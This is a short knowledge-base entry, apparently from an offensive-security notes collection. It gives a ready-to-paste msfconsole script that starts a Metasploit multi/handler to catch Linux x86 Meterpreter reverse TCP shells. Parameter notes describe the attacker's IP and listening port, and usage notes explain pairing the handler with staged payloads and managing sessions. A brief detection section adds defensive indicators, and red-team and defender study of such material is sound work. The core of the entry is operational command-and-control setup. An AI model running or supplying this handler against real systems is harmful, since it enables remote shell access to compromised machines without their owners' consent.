---
type: code
language: msfconsole
verified: true
platforms:
  - Linux
tags:
  - c2
  - handler
  - meterpreter
validated: true
---

# msfconsole-configure-multi-handler-for-linux-meterpreter

## Code

```msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST $_LHOST
set LPORT $_LPORT
exploit -j
```

## Description

This msfconsole script configures and starts a multi/handler exploit module to listen for reverse TCP connections from a Linux x86 Meterpreter stager. It sets the matching payload, host/port, and runs in job mode (-j) for background operation, allowing handling of multiple sessions without tying up the console.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_LHOST | Attacker's IP address for incoming connections | 192.168.1.100 |
| $_LPORT | Port to listen on | 4444 |

## Usage

Paste or source this into an msfconsole session on the attacker's machine before generating and executing the payload. It pairs with staged Meterpreter payloads to catch the reverse connection and deliver the full stage. Use `jobs` to manage and `sessions` to interact with opened Meterpreter prompts.

## Detection

- Monitor for msfconsole processes or Ruby executions with "multi/handler" strings in arguments.
- Network logs showing inbound connections on non-standard ports from internal hosts.
- Behavioral analytics for sudden outbound TCP from Linux endpoints to C2 IPs.
- File integrity monitoring on Metasploit installation directories.

## Related

- [[procedures/Linux-Staged-Reverse-TCP-Meterpreter-Shell]]
- [[tools/Metasploit-Framework]]
